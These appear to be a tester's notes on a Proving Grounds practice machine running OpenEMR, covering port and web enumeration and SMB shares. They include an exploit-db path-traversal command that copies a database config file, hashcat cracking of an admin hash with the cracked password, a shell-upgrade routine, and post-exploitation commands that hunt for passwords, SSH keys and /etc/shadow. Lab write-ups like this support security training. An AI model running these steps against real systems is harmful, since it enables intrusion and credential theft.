**Metadata**

- IP Address:  192.168.219.145
- Hostname: 
- OS: 	
- Found Credentials/Users:

	admin/thedoctor

Main Objectives:

Local.txt = 
Proof.txt = 

**Enumeration**

1. NMAP Scans (TCP/UDP)

```
[+] Running: Nmap BASIC TCP (top 1000)
[+] Command: nmap -sS -Pn -n --top-ports 1000 -T4 --open 192.168.219.145 -oN - 
# Nmap 7.95 scan initiated Sun Mar 15 13:26:46 2026 as: nmap -sS -Pn -n --top-ports 1000 -T4 --open -oN - 192.168.219.145
Nmap scan report for 192.168.219.145
Host is up (0.080s latency).
Not shown: 997 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
80/tcp   open  http
445/tcp  open  microsoft-ds
3306/tcp open  mysql

# Nmap done at Sun Mar 15 13:26:53 2026 -- 1 IP address (1 host up) scanned in 7.04 seconds
[+] Running: Nmap ALL TCP (all ports + versions)
[+] Command: nmap -sS -Pn -n -p- -T4 --open -sV --version-all 192.168.219.145 -oN /home/kali/ProvingGround/apex/nmap/full_tcp.nmap -oG /home/kali/ProvingGround/apex/nmap/full_tcp.gnmap 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-15 13:26 MDT
Nmap scan report for 192.168.219.145
Host is up (0.084s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.29 ((Ubuntu))
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3306/tcp open  mysql       MariaDB 5.5.5-10.1.48
Service Info: Host: APEX



```

2. Interesting Ports/Services

```
[+] Open TCP ports (open only): 80, 445, 3306
[+] Open UDP ports (open only): <none>

```

3. Web Enumeration 

```
Webserver Info - Apache httpd 2.4.29 ((Ubuntu))
Running Applications - 
Site Visit - Apex Hospital
- Found list of possible users and email addresses
- Found file upload http://192.168.219.145/filemanager/dialog.php?type=0&lang=en_EN&popup=0&crossdomain=0&relative_url=0&akey=key&fldr=%2F&69b70f7233009
- File upload location
- Tried to upload php file and use filter bypass. Failed.  

whatweb -v http://target

[+] Directory search BASIC on HTTP ports: 80
[+] Running: Gobuster BASIC (80)
[+] Command: gobuster dir -u http://192.168.219.145:80 -w /usr/share/wordlists/dirb/common.txt -t 50 -o /home/kali/ProvingGround/apex/gobuster/apex_192.168.219.145_80_dir_basic.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.219.145:80
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================

/assets               (Status: 301) [Size: 319] [--> http://192.168.219.145/assets/]
/filemanager          (Status: 301) [Size: 324] [--> http://192.168.219.145/filemanager/]
/index.html           (Status: 200) [Size: 28957]
/source               (Status: 301) [Size: 319] [--> http://192.168.219.145/source/]
/thumbs               (Status: 301) [Size: 319] [--> http://192.168.219.145/thumbs/]
Progress: 4387 / 4613 (95.10%)
Progress: 4613 / 4613 (100.00%)===============================================================
Finished

[+] Directory search ADVANCED on HTTP ports: 80
[+] Running: Gobuster ADVANCED (80)
[+] Command: gobuster dir -u http://192.168.219.145:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -o /home/kali/ProvingGround/apex/gobuster/apex_192.168.219.145_80_dir_advanced.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.219.145:80
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 319] [--> http://192.168.219.145/assets/]
/thumbs               (Status: 301) [Size: 319] [--> http://192.168.219.145/thumbs/]
/source               (Status: 301) [Size: 319] [--> http://192.168.219.145/source/]
/filemanager          (Status: 301) [Size: 324] [--> http://192.168.219.145/filemanager/]
/server-status        (Status: 403) [Size: 280]
Progress: 220537 / 220558 (99.99%)
===============================================================
Progress: 220558 / 220558 (100.00%)Finished

[+] Nikto scan on HTTP ports: 80
[+] Running: Nikto (80)
[+] Command: nikto -h http://192.168.219.145:80 -output /home/kali/ProvingGround/apex/web/192.168.219.145_80/nikto.txt -Format txt 
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.219.145
+ Target Hostname:    192.168.219.145
+ Target Port:        80
+ Start Time:         2026-03-15 14:12:18 (GMT-6)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /: Server may leak inodes via ETags, header found with file /, inode: 711d, size: 5c287d9d2c6e3, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: HEAD, GET, POST, OPTIONS .
+ /source/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ 8102 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2026-03-15 14:24:05 (GMT-6) (707 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

gobuster dir -u http://192.168.219.145/openemr -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.219.145/openemr
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 280]
/.html                (Status: 403) [Size: 280]
/images               (Status: 301) [Size: 327] [--> http://192.168.219.145/openemr/images/]
/templates            (Status: 301) [Size: 330] [--> http://192.168.219.145/openemr/templates/]
/.htm                 (Status: 403) [Size: 280]
/LICENSE              (Status: 200) [Size: 35147]
/sites                (Status: 301) [Size: 326] [--> http://192.168.219.145/openemr/sites/]
/config               (Status: 301) [Size: 327] [--> http://192.168.219.145/openemr/config/]
/modules              (Status: 301) [Size: 328] [--> http://192.168.219.145/openemr/modules/]
/common               (Status: 301) [Size: 327] [--> http://192.168.219.145/openemr/common/]
/public               (Status: 301) [Size: 327] [--> http://192.168.219.145/openemr/public/]
/library              (Status: 301) [Size: 328] [--> http://192.168.219.145/openemr/library/]
/services             (Status: 301) [Size: 329] [--> http://192.168.219.145/openemr/services/]
/.                    (Status: 302) [Size: 0] [--> interface/login/login.php?site=default]
/portal               (Status: 301) [Size: 327] [--> http://192.168.219.145/openemr/portal/]
/custom               (Status: 301) [Size: 327] [--> http://192.168.219.145/openemr/custom/]
/sql                  (Status: 301) [Size: 324] [--> http://192.168.219.145/openemr/sql/]
/contrib              (Status: 301) [Size: 328] [--> http://192.168.219.145/openemr/contrib/]
/.htaccess            (Status: 403) [Size: 280]
/tests                (Status: 301) [Size: 326] [--> http://192.168.219.145/openemr/tests/]
/Documentation        (Status: 301) [Size: 334] [--> http://192.168.219.145/openemr/Documentation/]
/.phtml               (Status: 403) [Size: 280]
/controllers          (Status: 301) [Size: 332] [--> http://192.168.219.145/openemr/controllers/]
/interface            (Status: 301) [Size: 330] [--> http://192.168.219.145/openemr/interface/]
/vendor               (Status: 301) [Size: 327] [--> http://192.168.219.145/openemr/vendor/]
/.htc                 (Status: 403) [Size: 280]
/ci                   (Status: 301) [Size: 323] [--> http://192.168.219.145/openemr/ci/]
/.html_var_DE         (Status: 403) [Size: 280]
/cloud                (Status: 301) [Size: 326] [--> http://192.168.219.145/openemr/cloud/]
/.htpasswd            (Status: 403) [Size: 280]
/.html.               (Status: 403) [Size: 280]
/.html.html           (Status: 403) [Size: 280]
/myportal             (Status: 301) [Size: 329] [--> http://192.168.219.145/openemr/myportal/]
/.htpasswds           (Status: 403) [Size: 280]
/.htm.                (Status: 403) [Size: 280]
/.htmll               (Status: 403) [Size: 280]
/.phps                (Status: 403) [Size: 280]
/.html.old            (Status: 403) [Size: 280]
/patients             (Status: 301) [Size: 329] [--> http://192.168.219.145/openemr/patients/]
/repositories         (Status: 301) [Size: 333] [--> http://192.168.219.145/openemr/repositories/]

/.gitignore           (Status: 200) [Size: 35]

/entities             (Status: 301) [Size: 329] [--> http://192.168.219.145/openemr/entities/]

/ccr                  (Status: 301) [Size: 324] [--> http://192.168.219.145/openemr/ccr/]
Progress: 63088 / 63088 (100.00%)
===============================================================
Finished

gobuster dir -u http://192.168.219.145/filemanager -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.219.145/filemanager
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 280]
/.html                (Status: 403) [Size: 280]
/js                   (Status: 301) [Size: 327] [--> http://192.168.219.145/filemanager/js/]
/css                  (Status: 301) [Size: 328] [--> http://192.168.219.145/filemanager/css/]
/.htm                 (Status: 403) [Size: 280]
/include              (Status: 301) [Size: 332] [--> http://192.168.219.145/filemanager/include/]
/img                  (Status: 301) [Size: 328] [--> http://192.168.219.145/filemanager/img/]
/config               (Status: 301) [Size: 331] [--> http://192.168.219.145/filemanager/config/]
/lang                 (Status: 301) [Size: 329] [--> http://192.168.219.145/filemanager/lang/]
/.                    (Status: 200) [Size: 26349]
/.htaccess            (Status: 403) [Size: 280]
/.phtml               (Status: 403) [Size: 280]
/.htc                 (Status: 403) [Size: 280]
/.html_var_DE         (Status: 403) [Size: 280]
/.htpasswd            (Status: 403) [Size: 280]
/.html.               (Status: 403) [Size: 280]
/.html.html           (Status: 403) [Size: 280]
/.htpasswds           (Status: 403) [Size: 280]
/.DS_Store            (Status: 200) [Size: 18436]
/.htm.                (Status: 403) [Size: 280]
/.htmll               (Status: 403) [Size: 280]
/.phps                (Status: 403) [Size: 280]
/.html.old            (Status: 403) [Size: 280]
/.html.bak            (Status: 403) [Size: 280]
/.ht                  (Status: 403) [Size: 280]
/.htm.htm             (Status: 403) [Size: 280]
/.hta                 (Status: 403) [Size: 280]
/.html1               (Status: 403) [Size: 280]
/.htgroup             (Status: 403) [Size: 280]
/.html.printable      (Status: 403) [Size: 280]
/.html.LCK            (Status: 403) [Size: 280]
/.htm.LCK             (Status: 403) [Size: 280]
/.htaccess.bak        (Status: 403) [Size: 280]
/.html.php            (Status: 403) [Size: 280]
/.htx                 (Status: 403) [Size: 280]
/.htmls               (Status: 403) [Size: 280]
/.htm2                (Status: 403) [Size: 280]
/.htlm                (Status: 403) [Size: 280]
/.html-               (Status: 403) [Size: 280]
/.htuser              (Status: 403) [Size: 280]
/.html-1              (Status: 403) [Size: 280]
/.htm.old             (Status: 403) [Size: 280]
/.htm.html            (Status: 403) [Size: 280]
/.html.sav            (Status: 403) [Size: 280]
/.htm.d               (Status: 403) [Size: 280]
/.htacess             (Status: 403) [Size: 280]
/.html.orig           (Status: 403) [Size: 280]
/.html_               (Status: 403) [Size: 280]
/.html_files          (Status: 403) [Size: 280]
/.htmlprint           (Status: 403) [Size: 280]
/.hts                 (Status: 403) [Size: 280]
/.htmlpar             (Status: 403) [Size: 280]
Progress: 63088 / 63088 (100.00%)
===============================================================
Finished


curl -i http://target

```

6. SMB Port 139, 445 Enumeration

```
smbclient -L //192.168.219.145 -U anonymous
Password for [WORKGROUP\anonymous]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        docs            Disk      Documents
        IPC$            IPC       IPC Service (APEX server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.219.145 failed (Error NT_STATUS_IO_TIMEOUT)
Unable to connect with SMB1 -- no workgroup available

smbmap -H 192.168.219.145                  
[+] IP: 192.168.219.145:445     Name: 192.168.219.145           Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        docs                                                    READ ONLY       Documents
        IPC$                                                    NO ACCESS       IPC Service (APEX server (Samba, Ubu

smbclient //192.168.101.110/Backup -N          

Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Apr  9 09:47:12 2021
  ..                                  D        0  Fri Apr  9 09:47:12 2021
  OpenEMR Success Stories.pdf         A   290738  Fri Apr  9 09:47:12 2021
  OpenEMR Features.pdf                A   490355  Fri Apr  9 09:47:12 2021

pdfinfo OpenEMR\ Features.pdf 
Creator:         Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Producer:        Skia/PDF m89
CreationDate:    Sat Apr  3 08:23:32 2021 MDT
ModDate:         Sat Apr  3 08:23:32 2021 MDT
Custom Metadata: no
Metadata Stream: no
Tagged:          no
UserProperties:  no
Suspects:        no
Form:            none
JavaScript:      no
Pages:           5
Encrypted:       no
Page size:       594.96 x 841.92 pts (A4)
Page rot:        0
File size:       490355 bytes
Optimized:       no
PDF version:     1.4

pdfinfo OpenEMR\ Success\ Stories.pdf 
Creator:         Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Producer:        Skia/PDF m89
CreationDate:    Sat Apr  3 08:24:24 2021 MDT
ModDate:         Sat Apr  3 08:24:24 2021 MDT
Custom Metadata: no
Metadata Stream: no
Tagged:          yes
UserProperties:  no
Suspects:        no
Form:            none
JavaScript:      no
Pages:           4
Encrypted:       no
Page size:       594.96 x 841.92 pts (A4)
Page rot:        0
File size:       290738 bytes
Optimized:       no
PDF version:     1.4



```

9. MySQL Enumeration

```
3306/tcp open  mysql       MariaDB 5.5.5-10.1.48
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
|   Thread ID: 33
|   Capabilities flags: 63487
|   Some Capabilities: SupportsTransactions, Speaks41ProtocolNew, SupportsCompression, LongPassword, SupportsLoadDataLocal, FoundRows, ODBCClient, Support41Auth, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, LongColumnFlag, InteractiveClient, DontAllowDatabaseTableColumn, Speaks41ProtocolOld, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: GN3S'hW[E&.T=tQv"BcO
|_  Auth Plugin Name: mysql_native_password
Service Info: Host: APEX

mysql -h 192.168.219.145 -P 3306 -u root      
WARNING: option --ssl-verify-server-cert is disabled, because of an insecure passwordless login.
ERROR 1698 (28000): Access denied for user 'root'@'192.168.45.215'


```

10. Possible Exploits

```
https://www.exploit-db.com/exploits/49359
```

11. Other Notes

```

```

**Initial Foothold** 

1. Exploit Steps

- Found a path transversal vulnerability in Responsive FileManager 9.13.4. 

![[Pasted image 20260317153044.png]]

- Researched sensitive files in Openemr. Found that that mysql passwords are in /site/default/sqlconf.php.

- Downloaded exploit. 

![[Pasted image 20260317153440.png]]

- Updated exploit code to use the Documents folder paste destination. 

![[Pasted image 20260317153712.png]]


- Ran exploit copying the sqlconf.php file.

```
python3 ./49359.py http://192.168.219.145 PHPSESSID=negu03jgrvl7q71qoccjkdlsgt /var/www/openemr/sites/default/sqlconf.php
```

![[Pasted image 20260317153916.png]]

- Logged into SMB, downloaded sqlconf.php, and viewed.

![[Pasted image 20260317154030.png]]

- Logged into mysql. 

```
mysql -h 192.168.219.145 -P 3306 -u openemr -p --skip-ssl
```

![[Pasted image 20260317154451.png]]

- Found the following data in the mysql database. 

![[Pasted image 20260317163357.png]]

- Cracked the bcrypt hash using hashcat.

```
hashcat -m 3200 -a 0  mysql_hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule 
```

![[Pasted image 20260317165151.png]]

```
admin/thedoctor
```

2. Shell Upgrade

```
python3 -c 'import pty; pty.spawn("/bin/bash")'

python -c 'import pty; pty.spawn("/bin/bash")'

/usr/bin/script -qc /bin/bash /dev/null

export TERM=xterm

export SHELL=/bin/bash

Ctrl+Z

stty raw -echo; fg

reset
```

**Post-Exploitation**

1. Identify & System Info

```
whoami

id

hostname

pwd

uname -a

cat /etc/os-release 2>/dev/null || cat /etc/issue 2>/dev/null

```

2. Environment

```
env

set 2>/dev/null | head -n 50

echo "$PATH"

echo "HOME=$HOME"; echo "SHELL=$SHELL"

```

3. User & Home Directories

```
cat /etc/passwd

ls -la /home

ls -la /root 2>/dev/null

sudo -l 2>/dev/null

sudo -V 2>/dev/null | head -n 10
```

4. Writable Paths & Permissions

```
find / -writable -type d 2>/dev/null | head -n 50

find / -writable -type f 2>/dev/null | head -n 50

echo "$PATH" | tr ':' '\n' | while read -r p; do [ -z "$p" ] && continue; if [ -w "$p" ]; then echo "WRITABLE: $p"; else echo "OK: $p"; fi; done

find / -user "$(id -un)" -type f 2>/dev/null | head -n 50

ls -l /etc/passwd 2>/dev/null

ls -l /etc/shadow 2>/dev/null

ls -la / 2>/dev/null

```

4. SUID / SGID / Capabilities

```
find / -perm -4000 -type f 2>/dev/null

find / -perm -2000 -type f 2>/dev/null

getcap -r / 2>/dev/null

```

5. Cron & Scheduled Tasks

```
cat /etc/crontab 2>/dev/null

ls -la /etc/cron.* 2>/dev/null

crontab -l 2>/dev/null
```

6. Processes & Network

```
ps aux

ps -ef

ss -tulwn 2>/dev/null

netstat -tulnp 2>/dev/null
```

7.  Software / Packages

```
dpkg -l 2>/dev/null | head -n 200

rpm -qa 2>/dev/null | head -n 200
```

8. Loot Files & Credentials

```
grep -R "password" /etc 2>/dev/null | head -n 50

ls -la /var/www 2>/dev/null

grep -R "password\|db\|user" /var/www 2>/dev/null | head -n 50

find /home -type f -name "*.txt" 2>/dev/null

find /home -type f -name "*history*" 2>/dev/null

find /home -type f \( -name "id_rsa" -o -name "id_*" \) 2>/dev/null

grep -Ri "password\|passwd\|secret\|token\|key" /home 2>/dev/null | head -n 50

find / -name "*.bak" -o -name "*~" 2>/dev/null | head -n 50
```

9.  Containers / Virtualization

```
ls -la /.dockerenv 2>/dev/null

grep -i docker /proc/1/cgroup 2>/dev/null
```

10. Automated Enumeration 

```


```

11. Possible PE Paths

```

```

**Privilege Escalation**

1. PE Steps

```

```

2. Notes

```

```

